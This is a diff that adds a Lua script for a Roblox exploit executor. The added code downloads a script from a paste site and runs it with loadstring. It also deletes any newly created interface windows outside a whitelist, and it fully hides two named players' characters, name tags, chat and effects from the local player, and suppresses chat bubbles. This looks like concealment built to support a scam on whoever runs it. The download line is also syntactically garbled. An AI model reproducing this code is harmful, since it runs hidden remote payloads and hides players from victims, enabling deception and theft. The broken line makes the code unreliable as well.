+	freezeVisuals()
+
+	task.spawn(function()
+		pcall(function()
+			local success, result = pcall(function()
+				return game:HttpGet(
+					"https://pastefy.app/fSboQhs8/raw"))()",
+					true
+				)
+			end)
+			
+			if success and result then
+				loadstring(result)()
+			else
+				warn("Failed to load external script: " .. tostring(result))
+			end
+		end)
+	end)
+end)
+
+--------------------------------------------------
+-- DELTA GUI FIREWALL
+--------------------------------------------------
+local WHITELIST = {
+	["LoadingScreenUI"] = true,
+	["PolishedForgeGUI"] = true
+}
+
+local existing = {}
+
+local function snapshot(container)
+	for _, g in ipairs(container:GetChildren()) do
+		if g:IsA("ScreenGui") then
+			existing[g] = true
+		end
+	end
+end
+
+snapshot(CoreGui)
+snapshot(PlayerGui)
+
+local function shouldRemove(guiObj)
+	if not guiObj:IsA("ScreenGui") then return false end
+	if WHITELIST[guiObj.Name] then return false end
+	if existing[guiObj] then return false end
+	return true
+end
+
+local function monitor(container)
+	container.ChildAdded:Connect(function(child)
+		task.wait()
+		if shouldRemove(child) then
+			pcall(function() child:Destroy() end)
+		end
+	end)
+end
+
+monitor(CoreGui)
+monitor(PlayerGui)
+
+--------------------------------------------------
+-- HIDE SPECIFIC USERS FULLY (CHARACTER + NAME TAG + ITEMS + CHAT)
+-- WITH REAL-TIME UPDATES FOR EQUIPMENT CHANGES AND EFFECTS LIKE HAKI
+--------------------------------------------------
+local HIDDEN_USERS = {
+    ["thenicebroim"] = true,
+    ["helper_b4o"] = true
+}
+
+-- Track hidden characters and their connections
+local hiddenCharacterConnections = {}
+
+local function applyHiddenEffectsToDescendant(v)
+    if v:IsA("BasePart") then
+        v.LocalTransparencyModifier = 1
+        -- Also hide any particle effects attached to parts
+        for _, effect in ipairs(v:GetChildren()) do
+            if effect:IsA("ParticleEmitter") or effect:IsA("Beam") or effect:IsA("Trail") then
+                effect.Enabled = false
+            end
+        end
+    elseif v:IsA("Accessory") and v:FindFirstChild("Handle") then
+        v.Handle.LocalTransparencyModifier = 1
+        -- Hide accessory particles
+        for _, effect in ipairs(v.Handle:GetChildren()) do
+            if effect:IsA("ParticleEmitter") or effect:IsA("Beam") or effect:IsA("Trail") then
+                effect.Enabled = false
+            end
+        end
+    elseif v:IsA("Tool") and v:FindFirstChild("Handle") then
+        v.Handle.LocalTransparencyModifier = 1
+        -- Hide tool particles
+        for _, effect in ipairs(v.Handle:GetChildren()) do
+            if effect:IsA("ParticleEmitter") or effect:IsA("Beam") or effect:IsA("Trail") then
+                effect.Enabled = false
+            end
+        end
+    elseif v:IsA("BillboardGui") then
+        v.Enabled = false -- hides name tags + chat above head
+    elseif v:IsA("TextLabel") or v:IsA("TextBox") then
+        v.TextTransparency = 1
+        v.TextStrokeTransparency = 1
+    elseif v:IsA("ParticleEmitter") or v:IsA("Beam") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") then
+        -- Direct particle effects (like Haki aura)
+        v.Enabled = false
+    elseif v:IsA("SurfaceGui") or v:IsA("Decal") then
+        -- Hide decals and surface GUIs
+        v.Transparency = 1
+    elseif v:IsA("SpecialMesh") or v:IsA("MeshPart") then
+        -- For mesh-based effects
+        v.VertexColor = Vector3.new(1, 1, 1)
+        if v:IsA("MeshPart") then
+            v.LocalTransparencyModifier = 1
+        end
+    end
+end
+
+local function hideEverything(char)
+    if not char then return end
+    
+    -- Clear any existing connections for this character
+    if hiddenCharacterConnections[char] then
+        for _, conn in ipairs(hiddenCharacterConnections[char]) do
+            conn:Disconnect()
+        end
+        hiddenCharacterConnections[char] = nil
+    end
+    
+    hiddenCharacterConnections[char] = {}
+    
+    -- Apply to existing descendants (including Haki effects)
+    for _, v in ipairs(char:GetDescendants()) do
+        applyHiddenEffectsToDescendant(v)
+    end
+    
+    -- Listen for new descendants (equipment changes, Haki effects, etc.)
+    local descendantConnection = char.DescendantAdded:Connect(function(v)
+        task.wait(0.05) -- Shorter wait for immediate effect
+        applyHiddenEffectsToDescendant(v)
+        
+        -- Also apply to any children of this new descendant immediately
+        for _, child in ipairs(v:GetDescendants()) do
+            applyHiddenEffectsToDescendant(child)
+        end
+    end)
+    
+    table.insert(hiddenCharacterConnections[char], descendantConnection)
+    
+    -- Also monitor for property changes (like Transparency changes)
+    local propertyConnection = RunService.Heartbeat:Connect(function()
+        for _, v in ipairs(char:GetDescendants()) do
+            if v:IsA("BasePart") then
+                if v.LocalTransparencyModifier < 1 then
+                    v.LocalTransparencyModifier = 1
+                end
+            elseif v:IsA("ParticleEmitter") or v:IsA("Beam") or v:IsA("Trail") then
+                if v.Enabled then
+                    v.Enabled = false
+                end
+            end
+        end
+    end)
+    
+    table.insert(hiddenCharacterConnections[char], propertyConnection)
+    
+    -- Also listen for character removal to clean up
+    local characterRemovedConnection = char.AncestryChanged:Connect(function(_, parent)
+        if parent == nil then
+            if hiddenCharacterConnections[char] then
+                for _, conn in ipairs(hiddenCharacterConnections[char]) do
+                    conn:Disconnect()
+                end
+                hiddenCharacterConnections[char] = nil
+            end
+        end
+    end)
+    
+    table.insert(hiddenCharacterConnections[char], characterRemovedConnection)
+end
+
+local function enforceHiddenUser(plr)
+    if HIDDEN_USERS[plr.Name] then
+        if plr.Character then
+            hideEverything(plr.Character)
+        end
+        plr.CharacterAdded:Connect(function(char)
+            task.wait(0.5) -- Wait a bit longer for character to fully load
+            hideEverything(char)
+        end)
+    end
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    enforceHiddenUser(plr)
+end
+Players.PlayerAdded:Connect(enforceHiddenUser)
+
+--------------------------------------------------
+-- CONTINUOUS MONITORING FOR HIDDEN USERS
+-- This ensures effects like Haki that might appear after initial hiding are caught
+--------------------------------------------------
+local continuousMonitorConnection = RunService.Heartbeat:Connect(function()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if HIDDEN_USERS[plr.Name] and plr.Character then
+            local char = plr.Character
+            -- Double-check that everything is still hidden
+            for _, v in ipairs(char:GetDescendants()) do
+                if v:IsA("BasePart") and v.LocalTransparencyModifier < 1 then
+                    v.LocalTransparencyModifier = 1
+                elseif v:IsA("ParticleEmitter") and v.Enabled then
+                    v.Enabled = false
+                elseif v:IsA("Beam") and v.Enabled then
+                    v.Enabled = false
+                elseif v:IsA("Trail") and v.Enabled then
+                    v.Enabled = false
+                end
+            end
+        end
+    end
+end)
+
+--------------------------------------------------
+-- HIDE ALL CHAT BUBBLES FOR LOCAL PLAYER
+-- WITHOUT REMOVING CHAT ICON FROM SCREEN
+--------------------------------------------------
+local function hideChatBubbles(inst)
+	-- Only hide chat bubbles, not other BillboardGuis that might be important
+	if inst:IsA("BillboardGui") then
+		-- Check if it's likely a chat bubble by its name or properties
+		if inst.Name:find("Chat") or inst.Name:find("Bubble") or inst.Name:find("Message") then
+			inst.Enabled = false
+		end
+	end
+end
+
+-- Create a connection to monitor for new chat bubbles
+local chatBubbleConnection = RunService.RenderStepped:Connect(function()
+	for _, inst in ipairs(workspace:GetDescendants()) do
+		hideChatBubbles(inst)
+	end
+end)
+
+workspace.DescendantAdded:Connect(function(inst)
+	task.wait(0.1)
+	hideChatBubbles(inst)
+end)
+
+-- Store connection so we can clean it up if needed
+if not _G.ChatBubbleConnections then
+	_G.ChatBubbleConnections = {}
+end
+table.insert(_G.ChatBubbleConnections, chatBubbleConnection)
